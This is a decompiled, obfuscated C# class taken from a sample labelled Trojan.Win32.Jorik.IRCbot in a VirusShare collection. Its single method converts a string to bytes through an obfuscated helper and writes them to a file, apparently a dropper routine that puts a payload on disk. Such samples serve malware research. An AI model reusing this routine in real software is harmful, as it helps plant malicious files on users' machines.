﻿// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A6501CE-651B-49EF-9CD4-6837233ABDB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Jorik.IRCbot.div-738c3979666da85c3c9872a05697e6bff01b107645b92c3a808be0f2a7bf41a4.exe

using System.IO;
using System.Runtime.InteropServices;

namespace \u007F
{
  internal sealed class \u0082
  {
    public static void \u009A([In] string obj0, [In] string obj1)
    {
      string str = obj0;
      byte[] numArray = \u0092.\u009B\u0002(str);
      FileStream fileStream = new FileStream(obj1, FileMode.Create);
      \u0001\u0003.\u007E\u0016\u0004((object) fileStream, numArray, 0, numArray.Length);
      \u0011\u0002.\u007E\u0012\u0004((object) fileStream);
    }
  }
}